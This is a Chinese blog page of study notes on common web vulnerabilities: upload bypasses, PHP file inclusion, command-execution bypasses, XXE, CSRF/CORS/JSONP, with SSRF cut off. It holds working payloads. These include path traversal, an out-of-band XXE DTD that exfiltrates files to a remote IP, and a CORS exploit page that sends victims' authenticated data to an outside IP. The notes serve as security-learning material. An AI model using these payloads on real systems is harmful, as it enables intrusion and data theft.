@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="网络安全,攻防研究" />
+  <meta name="author" content="B Stark" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      web常见漏洞 
+      
+      
+      |
+    
+     B.Stark&#39;Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="B.Stark'Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">BStark</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">web常见漏洞</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-01-08 20:54:52
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/web%E6%B8%97%E9%80%8F/" title="web渗透">
+                    <b>#</b> web渗透
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h2><p><strong>Windows系统特性</strong>:’a.php.’, ‘a.php ‘, ‘a.php::$DATA’, ‘a.php:a.jpg’, ‘dir::$INDEX…’</p>
+<p><strong>黑名单</strong> :黑名单不全,大小写,双写</p>
+<p><strong>00截断</strong>:条件:php5.3 以下</p>
+<p><strong>中间件解析漏洞</strong></p>
+<ul>
+<li>apache + php</li>
+</ul>
+<p>条件:2.4以下  解析特性，从右向左解析</p>
+<p>利用:a.php.xxx  a.php.7z</p>
+<ul>
+<li>nginx + php&amp;iis + php</li>
+</ul>
+<p>利用:upload/a.jpg/.php</p>
+<ul>
+<li>iis + asp</li>
+</ul>
+<p>条件:iis6 以下</p>
+<p>a.asp;.jpg   被解析成asp<br>a.asp/xxx.jpg   a.asp文件夹 文件夹内所有文件被解析成asp        </p>
+<h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()		找不到被包含的文件时只产生警告，脚本将继续执行</span><br><span class="line"><span class="keyword">include_once</span>()	此语句和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</span><br><span class="line"><span class="keyword">require</span>()		找不到被包含的文件时会产生致命错误，并停止脚本</span><br><span class="line"><span class="keyword">require_once</span>()	此语句和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</span><br></pre></td></tr></table></figure>
+
+<p><strong>php.ini 配置</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=On/Off		—是否允许打开URL文件，该选项为on便是允许包含URL对象文件等。默认开启</span><br><span class="line">allow_url_include=On/Off	—是否允许引用URL文件，激活URL形式的fopen封装协议使得可以访问URL对象文件等。默认关闭</span><br></pre></td></tr></table></figure>
+
+<p><strong>paylod:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=C:\Windows\System32\drivers\etc\host</span><br><span class="line">?action=..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><strong>条件:</strong></p>
+<p>php.ini配置需要全开</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=On	（默认为OFF，需要在php.ini中手动打开）</span><br><span class="line">allow_url_fopen=On		（是否允许打开远程文件）</span><br></pre></td></tr></table></figure>
+
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[URL]?path=http://ip/info.php				//通过http协议加载目标机中的info.php文件</span><br><span class="line">[URL]?path=ftp://用户名:密码@ip/info.php		//通过ftp协议加载目标机中的info.php文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">all_url_include在php 5.2以后添加,安全方便的设置(php的默认设置)为:allow_url_fopen=on;all_url_include=off;</span><br><span class="line">allow_url_fopen = On (允许打开URL文件,预设启用)</span><br><span class="line">allow_url_fopen = Off (禁止打开URL文件)</span><br><span class="line">allow_url_include = Off (禁止引用URL文件,新版增加功能,预设关闭)</span><br><span class="line">allow_url_include = On (允许引用URL文件,新版增加功能)</span><br></pre></td></tr></table></figure>
+
+<p>禁止allow_url_include解决了远端引用(Include)的问题, 同时又让我们还可以在<br>一般的情形下使用fopen去打开远端的档案, 而不必再牵连上打开include函数所带来的风险.<br>因此在新版PHP中allow_url_fopen选项预设是打开的,而allow_url_include则预设是关闭的.<br>然而事实上若从系统角度来看,即使禁止了PHP的allow_url_fopen和allow_url_include功能,<br>其实也不能完全阻止远端调用及其所带来的安全隐忧,而且它们只是保护了标记为URL的句柄,<br>也就是说只能影响http(s)和ftp(s)的调用, 但对包含其他标记的远端调用,例如对PHP5.2.0<br>新版所提供的php和data则无能为力,而这些调用一样会导致注入风险</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>1.file://协议</strong></p>
+<p>•用途：访问本地系统文件<br>•使用条件：allow_url_fopen：off<br>                     allow_url_include：off</p>
+<p>file://协议在两个配置都为off的情况下是可以正常使用的<br>•使用方法：file://文件的绝对路径和文件名<br>•举例：[?path=file://c:\windows\System32\drivers\etc\hosts]</p>
+<p><strong>2.php://filter</strong><br>•用途：常用于读取文件/源码<br>•使用条件：allow_url_fopen：off<br>                     allow_url_include：off   </p>
+<p>php://filter 两个配置都为off的情况下是可以正常使用的<br>•使用：[?path=<strong>php://filter/read=convert.base64-encode/resource</strong>=文件.php]<br>•注意：通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。</p>
+<p><strong>3.php://input</strong><br>•用途：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行<br>•使用条件：allow_url_fopen：off<br>                     allow_url_include：on<br>•使用方法：?file=php://input[POST]：<?phpphpinfo()?>(执行POSTDATA中的内容)</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>PHP相关执行函数</p>
+<p>php.ini</p>
+<p><strong>disable_functions</strong> 项</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.system <span class="number">2</span>.exec() <span class="number">3</span>.shell_exec() <span class="number">4</span>.passthru() <span class="number">5</span>.popen() <span class="number">6</span>.反引号</span><br></pre></td></tr></table></figure>
+
+<p>Windows 系统特殊语法</p>
+<table>
+<thead>
+<tr>
+<th>命令格式</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>command1 &amp; command2</td>
+<td>先后执行 Command1和 command2，无论command1执行是否成功</td>
+</tr>
+<tr>
+<td>Command1&amp;&amp;command2</td>
+<td>先后执行 Command1和 command2，只有command1执行成功时才<br/>执行command2</td>
+</tr>
+<tr>
+<td>Command1||Command2</td>
+<td>先后执行 Command1和 command2，只有command1执行失败时才<br/>执行command2</td>
+</tr>
+<tr>
+<td>Command1|command2</td>
+<td>|是管道符，将command1的执行结果 传递给 command2</td>
+</tr>
+</tbody></table>
+<p>linux 系统特殊语法<br>| 命令格式             | 含义                                                         |<br>| ——————– | ———————————————————— |<br>| command1;command2    | 先后执行Command1和command2，无论command1执行是否成功         |<br>| Command1&amp;&amp;command2   | 先后执行Command1和command2，只有command1执行成功时才执行command2 |<br>| Command1||command2 | 先后执行Command1和command2，只有command1执行失败时才执行command2 |<br>| Command1|command2   | |是管道符，将command1的执行结果传递给command2               |</p>
+<p>绕过Disable_functions</p>
+<ul>
+<li>常规绕过：exec,shell_exec,system,passthru,popen,proc_open</li>
+<li>利用环境变量 LD_PRELOAD 绕过 （重要）</li>
+<li>利用 pcntl_exec 绕过</li>
+<li>利用 imap_open 函数任意命令执行(CVE-2018-19518)</li>
+<li>利用系统组件 window com 绕过</li>
+<li>利用 Apache+mod_cgi+.htaccess 绕过</li>
+<li>利用 ImageMagick 漏洞绕过</li>
+<li>利用 PHP7.4 的FFI绕过</li>
+<li>利用 ShellShock 绕过(CVE-2014-6271)</li>
+<li>蚁剑插件</li>
+</ul>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p><strong>XML</strong> 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）,XML 被设计用来传输和存储数据.</p>
+<p><strong>实体</strong></p>
+<p>内部实体 <code>&lt;!ENTITY a &quot;hello world&quot;&gt;</code><br>外部实体 <code>&lt;!ENTITY a &quot;url&quot;&gt;</code></p>
+<p><strong>参数实体</strong> </p>
+<p> 供DTD调用的实体（有%就是参数实体）</p>
+<p>内部参数实体：<code>&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;</code><br>外部参数实体：<code>&lt;!ENTITY % test SYSTEM &quot;url&quot;&gt;</code>     外部参数实体用私有函数 SYSTEM,共有函数为public</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [&lt;!--定义此文档是关于note元素的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span>(<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>XXE</strong>  XXE漏洞也叫XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">        <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">aaaa</span> [<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span> <span class="comment">&lt;!--类似于html的外部css,js的引入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">                <span class="symbol">&amp;a;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>XXE攻击</strong></p>
+<p><strong>有回显</strong></p>
+<p>内部DTD:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">aaaa</span> [<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;a;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>外部DTD:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">     <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">copyright</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/dtd.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">         %test;]&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--%test;相当于把外部实体拉入到内部实体,然后执行.--&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="comment">&lt;!--&amp;xxe;这里就可以直接执行&amp;xxe了,因为上面已经拉取到了内部实体中,可以直接执行调用了.--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>外部DTD文件,dtd.dtd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>无回显</strong></p>
+<p>外部DTD：<br>        1. 在xml内部dtd中定义一个外部参数实体引入外部dtd，外部参数实体的值是外部dtd的url<br>                2. 在外部或内部dtd中定义一个外部参数实体，外部参数实体的值是payload<br>                3. 在外部dtd文件中，定义一个参数实体，参数实体的值再进行定义一个外部参数实体，再次定义的外部参数实体值是 url 拼接外带，url+（参数实体的调用）<br>                        4. 在内部dtd中，分别调用三个外部参数实体，分别是第一步创建的一个和第三步创建的两个</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line">        <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">aaaa</span> [<span class="meta">&lt;!ENTITY % a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://172.16.12.187:10000/file.dtd&quot;</span>&gt;</span>%a;%y;%z;]&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            s</span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 外部DTD文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % x <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % y <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; z SYSTEM &#x27;http://172.16.12.187:10001/?fwaf=%x;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>xxe防御</strong> ： </p>
+<p>1.禁用外部实体  </p>
+<p>2.对传入的xml进行严格过滤     </p>
+<p>3.libxml_disable_entity_loader(true); </p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p><strong>概念</strong></p>
+<p>是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p>
+<p><strong>判断</strong></p>
+<p>在一个request请求消息中，所有的参数都可控，所有的参数你都可以知道</p>
+<p><strong>防御</strong></p>
+<ul>
+<li><p>随机token</p>
+</li>
+<li><p>加验证码</p>
+</li>
+<li><p>检查referer</p>
+</li>
+</ul>
+<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p><strong>概念</strong></p>
+<p>相同的URI、主机名和端口号为同源,否则不允许资源的访问和读取,同源策略仅适用于脚本.HTML标签[2]访问不同来源网站上的图像、CSS和动态加载脚本等资源不受同源策略的限制,而跨站请求伪造就是利用同源策略不适用于HTML标签的缺陷.</p>
+<h3 id="同源策略解决方案"><a href="#同源策略解决方案" class="headerlink" title="同源策略解决方案"></a>同源策略解决方案</h3><p>cors和jsonp是解决浏览器默认同源策略限制，进行不同源之间数据传输的技术,cors支持所有和http请求.</p>
+<h4 id="Cors"><a href="#Cors" class="headerlink" title="Cors"></a>Cors</h4><p>cors（跨域资源共享 Cross-origin resource sharing），它允许浏览器向跨域服务器发出XMLHttpRequest请求，从而克服跨域问题，它需要浏览器和服务器的同时支持。</p>
+<p><strong>判断</strong></p>
+<p>请求头中添加 <code>Origin:www.baidu.com</code> 看响应头 <code>Access-Control-Allow-Origin: www.baidu.com</code></p>
+<p><strong>利用</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS TEST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;output&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="javascript">			req.onload = reqListener; </span></span><br><span class="line"><span class="javascript">			req.open(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://127.0.0.1:8082/DoraBox/csrf/userinfo.php&#x27;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">			<span class="comment">//req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;); </span></span></span><br><span class="line"><span class="javascript">			req.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">			req.send();</span></span><br><span class="line"><span class="javascript">			<span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">new</span> Image().src=<span class="string">&quot;http://101.34.185.252:10002/&quot;</span> + <span class="built_in">window</span>.btoa(<span class="built_in">unescape</span>(<span class="built_in">encodeURIComponent</span>(<span class="built_in">JSON</span>.stringify(req.responseText))))</span></span><br><span class="line"><span class="javascript">			&#125;;</span></span><br><span class="line"><span class="javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Jsonp"><a href="#Jsonp" class="headerlink" title="Jsonp"></a>Jsonp</h4><p>jsonp的原理就是利用就是利用<code>script</code>标签没有跨域限制，可以通过<code>script</code>标签的src属性发送<code>GET</code>请求,JSONP只支持GET请求。</p>
+<p><strong>判断</strong></p>
+<p>必须有callback信息回显,前后端约定一个callback字段名，来传递函数名，前端通过该函数来拿到数据。</p>
+<p><code>callback=aaaa    aaaa(&#123;json含有敏感信息&#125;)</code></p>
+<p><strong>利用</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP EXP跨域测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">json</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">&quot;http://127.0.0.1:10002/&quot;</span> + <span class="built_in">JSON</span>.stringify(json)</span></span><br><span class="line"><span class="javascript"><span class="comment">//alert(JSON.stringify(json))</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8082/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网,特点是突出<strong>网络访问</strong>。SSRF攻击通常针对外部网络无法直接访问的内部系统</p>
+<p>SSRF涉及到的危险函数主要是<strong>网络访问</strong>，支持伪协议的<strong>网络读取</strong>。以PHP为例，涉及到的函数有 <code>file_get_contents()</code> / <code>fsockopen()</code> / <code>curl_exec()</code> 等</p>
+<p><strong>危害</strong></p>
+<p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
+<p><strong>利用</strong></p>
